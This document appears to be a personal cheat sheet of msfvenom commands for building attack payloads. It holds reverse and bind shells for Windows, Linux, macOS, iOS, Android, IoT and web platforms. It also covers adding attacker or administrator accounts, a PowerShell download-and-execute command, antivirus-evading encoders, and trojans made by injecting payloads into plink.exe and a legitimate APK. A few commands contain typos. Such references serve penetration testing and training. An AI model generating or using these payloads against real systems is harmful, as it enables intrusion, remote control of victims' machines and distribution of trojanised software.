

# MSF-Venom Syntax

```nasm
msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>
```


##### General Usage & Syntax explain in a lil more depth

**Common Parameters**

- `-b "\x00\x0a\x0d"` -> avoid bad chars.
    
- `-e <encoder>` -> apply an encoder (like, `x86/shikata_ga_nai`)
    
- `-i <num>` -> encoding iterations
    
- `-a <arch>` -> target architecture (`x86`, `x64`, `armle`, `mipsbe`)
    
- `--platform <os>` -> specify OS (`windows`, `linux`, `osx`, etc.)
    
- `-x <file>` -> inject into an existing binary
    
- `-k` -> preserve functionality of host binary when injecting payload
    
- `EXITFUNC=thread` -> set exit method for Windows payloads



# Listing

```bash
msfvenom -l payloads # -l | lists, <wtv>
msfvenom -l encoders # 
```






# Common parameters when creating a shellcode

```bash
-b "\\x00\\x0a\\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True # Use this to create a shellcode that will execute something with SUID
```

# Windows

Payload creation for windows operating system

## Reverse Shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(HOST) LPORT=(PORT) -f exe > reverse.exe

msfsvenom -p windows/x6464/meterpreter_reverse_tcp LHOSt=(HOST) LPORT=(PORT) -f exe > shell.exe
```

## Bind Shell

```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(HOST) LPORT=(PORT) -f exe > bind.exe
```

## Create User

```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```

## CMD Shell

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(HOST) LPORT=(PORT) -f exe > prompt.exe
```

## Execute Command

```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \\"IEX(New-Object Net.webClient).downloadString('<http://IP/nishang.ps1>')\\"" -f exe > pay.exe

msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```

## Encoder

```bash
msfvenom -p  windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```

## Embedded inside executables

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```

 

## Reverse TCP & HTTPS
```bash
# Meterpreter over HTTPS
msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -f exe > revhttps.exe
```

## Staged vs. Stageless
- Staged: `windows/meterpreter/reverse_tcp` *(sends in parts, smaller initial size)*  
- Stageless: `windows/meterpreter_reverse_tcp` *(all-in-one, stealthier detections)*  

```bash
# Stageless (often avoids AV in some cases)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe
```

## Powershell Payload
```bash
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.ps1
```

## DLL Payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > payload.dll
```


# Linux

Payloads for Linux Operating System

## Reverse Shell

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf

msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```


```
msfvenom -p linux/x86/adduser USER=defaultuser PASS=intruder!98 -f elf > adduser.elf
```

## Bind Shell

```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```

## SunOS (Solaris)

```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\\x00' > solshell.elf
```


# MAC

Payloads for MAC Operating System

## Reverse Shell

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```

## Bind Shell

```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```

# Web Based Payloads

Payloads for web based applications

## PHP Reverse Shell

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php

cat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php
```

## ASP/x Reverse Shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp

msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```

## JSP Reverse Shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```

## WAR Reverse Shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```

## NodeJS

```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```

# Script Language Payloads

Payloads for Scripting Language based

## Perl

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```

## Python

```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```

## Bash

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```

## Script Language Payloads



```bash
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > rev.pl msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > rev.py msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh msfvenom -p ruby/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.rb`
```

---

## IoT / Embedded



```bash
msfvenom -p linux/armle/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > arm_payload.elf msfvenom -p linux/mipsbe/shell_bind_tcp LHOST=<IP> LPORT=<PORT> -f elf > mips_payload.elf`
```


## Android Payloads

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -o backdoor.apk 
```


# Embed into legitimate APK 
```
msfvenom -x legitimate.apk -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -o trojan.apk
```

## iOS Payloads
Requires, jailbreak, not common but fun for research
## **Reverse Shell**



```bash
msfvenom -p apple_ios/aarch64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > shell_ios64.macho`
```

_(64-bit iOS reverse shell, this requires device-side execution, usually on a jailbroken device so not really practical but coolio_

---

## **Bind Shell**

```bash
msfvenom -p apple_ios/aarch64/shell_bind_tcp RHOST=<IP> LPORT=<PORT> -f macho > bind_ios64.macho
```

_(Binds a shell and waits for incoming connections.)_


## Quick cmds && Love em

- Generate C-style shellcode:
    
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c -b "\x00\x0a\x0d"
```

- Generate raw binary shellcode:
    
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > payload.bin
```
- Display payload options:
    


```bash
msfvenom -p windows/meterpreter/reverse_tcp --payload-options
```
- Show size of compiled payload:
    


```
msfvenom -p windows/meterpreter/reverse_tcp -f exe -o out.exe -v | grep "Payload size"`
```
- Test payload generation without saving file:
    

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe | sha1sum`
```















